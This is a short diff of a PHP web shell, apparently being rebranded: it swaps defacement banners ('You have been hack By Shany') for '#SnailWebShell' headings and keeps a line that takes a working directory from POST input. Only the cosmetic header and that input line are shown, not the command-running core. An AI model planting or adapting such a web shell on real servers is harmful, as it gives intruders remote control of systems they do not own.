@@ -3,10 +3,10 @@
 set_magic_quotes_runtime(0);
 
 print "<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>";
-print "<center><h1>#worst @dal.net</h1></center>";
-print "<center><h1>You have been hack By Shany with Love To #worst.</h1></center>";
-print "<center><h1>Watch Your system Shany was here.</h1></center>";
-print "<center><h1>Linux Shells</h1></center>";
+print "<center><h1>#SnailWebShell @d2r.in</h1></center>";
+print "<center><h1># fL@$hm0 fLa$h #anon</h1></center>";
+print "<center><h1>Watch Your system</h1></center>";
+print "<center><h1>Linux Shell</h1></center>";
 print "<hr><hr>";
 
 $currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
